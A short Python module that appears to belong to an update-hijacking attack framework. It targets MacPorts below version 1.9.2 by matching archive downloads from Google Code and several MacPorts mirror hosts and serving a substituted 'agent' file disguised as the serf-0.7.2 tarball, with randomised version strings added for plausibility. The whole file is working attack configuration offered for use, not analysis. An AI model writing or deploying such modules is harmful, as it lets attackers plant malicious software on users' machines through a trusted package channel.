from modules import ModuleBase


class Port(ModuleBase):
    name = 'port'
    version = '1.0'
    appver = '< 1.9.2'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(code.google.com|serf.googlecode.com|aarnet.au.distfiles.macports.org|distfiles.macports.org|www.mirrorservice.org|lil.fr.distfiles.macports.org|ykf.ca.distfiles.macports.org)' 
    agent_filename = './agent/serf-0.7.2.tar.bz2'
    requests = [
        {   'path': '(.tar.gz|.gz|.zip|.tar.bz2)',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'module': {
            'val': "module.options['brequest']['val'].split('/')[-1]",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
